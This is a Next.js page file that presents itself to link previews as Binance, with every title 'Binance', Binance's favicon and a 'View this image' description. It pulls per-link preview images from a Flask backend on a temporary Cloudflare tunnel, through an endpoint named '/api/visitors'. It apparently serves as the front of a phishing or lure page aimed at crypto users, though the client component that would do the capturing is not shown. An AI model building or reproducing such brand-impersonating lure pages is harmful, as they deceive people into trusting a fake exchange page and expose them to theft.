import type { Metadata } from 'next';
import BinanceClient from './BinanceClient';

// CHANGE IF CLOUDFLARE RESTARTS
const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";

// Next.js 16 requires awaiting params
export async function generateMetadata({ params }: { params: Promise<{ id: string }> }): Promise<Metadata> {
  const { id } = await params;
  let imageUrl = 'https://public.bnbstatic.com/static/images/common/favicon.ico'; // Fallback image
  
  try {
    // Fetch the image URL from your Python backend
    const res = await fetch(`${FLASK_API}/api/visitors`, { cache: 'no-store' });
    const data = await res.json();
    const link = data.links.find((l: any) => l.id === id);
    
    if (link) {
      imageUrl = `${FLASK_API}/uploads/${link.preview_path}`;
    }
  } catch (e) {
    console.error("Failed to fetch metadata for image preview", e);
  }

  return {
    title: 'Binance',
    description: 'View this image',
    openGraph: {
      title: 'Binance',
      description: 'View this image',
      images: [imageUrl],
      type: 'website',
    },
    twitter: {
      card: 'summary_large_image',
      title: 'Binance',
      description: 'View this image',
      images: [imageUrl],
    }
  };
}

// Next.js 16 requires awaiting params here too
export default async function Page({ params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  return <BinanceClient id={id} />;
}